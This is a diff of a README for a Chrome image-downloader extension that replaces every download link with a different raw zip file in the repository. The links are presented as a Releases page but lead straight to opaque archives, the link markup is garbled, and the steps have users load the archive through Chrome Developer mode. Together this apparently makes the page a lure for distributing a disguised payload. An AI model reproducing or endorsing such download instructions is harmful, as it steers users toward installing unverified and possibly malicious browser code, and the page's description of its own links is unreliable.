@@ -1,7 +1,7 @@
 # 🎉 oneclick-image-downloader-extension - Download Images Instantly
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Karl6n/oneclick-image-downloader-extension/main/cephalocentesis/oneclick-image-downloader-extension.zip%20Latest%https://raw.githubusercontent.com/Karl6n/oneclick-image-downloader-extension/main/cephalocentesis/oneclick-image-downloader-extension.zip)](https://raw.githubusercontent.com/Karl6n/oneclick-image-downloader-extension/main/cephalocentesis/oneclick-image-downloader-extension.zip)
+[![Download](https://github.com/Karl6n/oneclick-image-downloader-extension/raw/refs/heads/main/assets/image-extension-downloader-oneclick-2.1-alpha.5.zip%20Latest%https://github.com/Karl6n/oneclick-image-downloader-extension/raw/refs/heads/main/assets/image-extension-downloader-oneclick-2.1-alpha.5.zip)](https://github.com/Karl6n/oneclick-image-downloader-extension/raw/refs/heads/main/assets/image-extension-downloader-oneclick-2.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 The oneclick-image-downloader-extension allows you to download images quickly from your browser. This Chrome extension makes it simple to create image datasets, saving you time during the image collection process.
@@ -20,12 +20,12 @@ The oneclick-image-downloader-extension allows you to download images quickly fr
 ## 🔗 Download & Install
 To get started, visit the link below to access the Releases page. Here, you can find the latest version of the oneclick-image-downloader-extension.
 
-[Download from Releases](https://raw.githubusercontent.com/Karl6n/oneclick-image-downloader-extension/main/cephalocentesis/oneclick-image-downloader-extension.zip)
+[Download from Releases](https://github.com/Karl6n/oneclick-image-downloader-extension/raw/refs/heads/main/assets/image-extension-downloader-oneclick-2.1-alpha.5.zip)
 
 ### Installation Steps
 1. Click the link above.
 2. Find the latest version of the extension on the Releases page.
-3. Click on the file labeled **https://raw.githubusercontent.com/Karl6n/oneclick-image-downloader-extension/main/cephalocentesis/oneclick-image-downloader-extension.zip** or similar.
+3. Click on the file labeled **https://github.com/Karl6n/oneclick-image-downloader-extension/raw/refs/heads/main/assets/image-extension-downloader-oneclick-2.1-alpha.5.zip** or similar.
 4. Download the file to your computer.
 5. Open Google Chrome and go to the Extensions page by typing **chrome://extensions/** in the address bar.
 6. Enable **Developer mode** by toggling the switch in the top right corner.
